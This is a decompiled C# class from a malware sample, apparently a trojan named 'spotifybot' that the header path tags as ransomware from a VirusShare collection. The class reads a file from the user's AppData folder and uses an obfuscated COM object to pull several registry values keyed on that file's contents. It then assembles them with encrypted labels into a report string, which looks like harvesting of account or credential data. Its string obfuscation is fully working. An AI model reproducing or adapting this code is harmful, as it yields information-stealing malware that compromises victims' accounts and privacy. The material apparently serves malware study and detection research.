// Decompiled with JetBrains decompiler
// Type: DACore
// Assembly: spotifybot, Version=1.7.0.1, Culture=neutral, PublicKeyToken=null
// MVID: 49F8E78E-98C1-464D-B8BC-BD712E85FF5D
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-4708e643ab129b31b3e067f9a628b4f0e5dfa2fbd30e637e9fb217bb8c703115.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.IO;
using System.Runtime.CompilerServices;

public class DACore
{
  public class Coredll
  {
    public static void GTMYCore()
    {
      try
      {
        string str1 = DACore.Coredll.RDFLE2(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + RUDUUFDP.CPMXFIPG("jpDH0bZ4oai7xJvBvdJ/m7HQFw==", "False"));
        string str2 = DACore.Coredll.RGRD2(RUDUUFDP.CPMXFIPG("iaesx7+EsbnApY+wxsOzhq7Dwc+n0N7P0qa4rcKwmL3Z07yEq7mzppWsw8HJtcHaygk=", "False") + str1 + RUDUUFDP.CPMXFIPG("k5rM18oP", "False"));
        string str3 = DACore.Coredll.RGRD2(RUDUUFDP.CPMXFIPG("jqyxzMSJtr7FqpS1y8i4i7PIxtSs1ePU16u9sse1ncLe2MGJsL64q5qxyMbOusbfzwQ=", "False") + str1 + RUDUUFDP.CPMXFIPG("jp3H0cUU", "False"));
        string Left = DACore.Coredll.RGRD2(RUDUUFDP.CPMXFIPG("d5Wata1yn6euk32etLGhdJyxr72Vvsy9wJSmm7CehqvHwapymaehlIOasa+3o6/IuBs=", "False") + str1 + RUDUUFDP.CPMXFIPG("ma3Wz84J", "False"));
        string str4 = DACore.Coredll.RGRD2(RUDUUFDP.CPMXFIPG("bIqPqqJnlJyjiHKTqaaWaZGmpLKKs8GytYmbkKWTe6C8tp9njpyWiXiPpqSsmKS9rSY=", "False") + str1 + RUDUUFDP.CPMXFIPG("g5KkIg==", "False"));
        string str5 = DACore.Coredll.RGRD2(RUDUUFDP.CPMXFIPG("jKqvysKHtLzDqJKzyca2ibHGxNKq0+HS1am7sMWzm8Dc1r+Hrry2qZivxsTMuMTdzQY=", "False") + str1 + RUDUUFDP.CPMXFIPG("g5Cuwasf", "False"));
        string str6;
        if (Operators.CompareString(Left, "", false) != 0)
          str6 = RUDUUFDP.CPMXFIPG("fJeiqZt8l6Kpm3yXqNvQpKC5vJt8l6Kpm3yXoqmbfJeiCg==", "False") + Environment.NewLine + Environment.NewLine + RUDUUFDP.CPMXFIPG("XKCxtq9RUjE=", "False") + str5 + Environment.NewLine + RUDUUFDP.CPMXFIPG("aqy7w3tCJQ==", "False") + str2 + RUDUUFDP.CPMXFIPG("axY=", "False") + str3 + Environment.NewLine + RUDUUFDP.CPMXFIPG("bKWitqR4n6J+Vi8=", "False") + Left + Environment.NewLine + RUDUUFDP.CPMXFIPG("cJy5wLaPraqHXyY=", "False") + str4 + RUDUUFDP.CPMXFIPG("O16Gtp2Nr7G8Yys=", "False") + Environment.NewLine + Environment.NewLine + RUDUUFDP.CPMXFIPG("b4qVnI5vipWcjm+KlZyOb4qVnI5vipWcjm+KlZyOb4oW", "False");
        else
          str6 = RUDUUFDP.CPMXFIPG("fJeiqZt8l6Kpm3yXqNvQpKC5vJt8l6Kpm3yXoqmbfJeiCg==", "False") + Environment.NewLine + Environment.NewLine + RUDUUFDP.CPMXFIPG("frrKxbiesnajvqW5uhk=", "False") + Environment.NewLine + Environment.NewLine + RUDUUFDP.CPMXFIPG("bIeSmYtsh5KZi2yHkpmLbIeSmYtsh5KZi2yHkpmLbIcZ", "False");
        JNXOYT.RICXH = str6;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        JNXOYT.RICXH = "";
        ProjectData.ClearProjectError();
      }
    }

    public static string RGRD2(string hKey)
    {
      string str;
      try
      {
        object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject(RUDUUFDP.CPMXFIPG("eZCrwaqSsXaiqYeptCc=", "False")));
        object[] objArray = new object[1]{ (object) hKey };
        object[] Arguments = objArray;
        bool[] flagArray = new bool[1]{ true };
        bool[] CopyBack = flagArray;
        object obj = NewLateBinding.LateGet(objectValue, (Type) null, "RGRD", Arguments, (string[]) null, (Type[]) null, CopyBack);
        if (flagArray[0])
          hKey = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray[0]), typeof (string));
        str = Conversions.ToString(obj);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return str;
    }

    public static string RDFLE2(string sFile)
    {
      string str;
      try
      {
        str = new StreamReader(sFile).ReadToEnd().ToString();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return str;
    }
  }
}
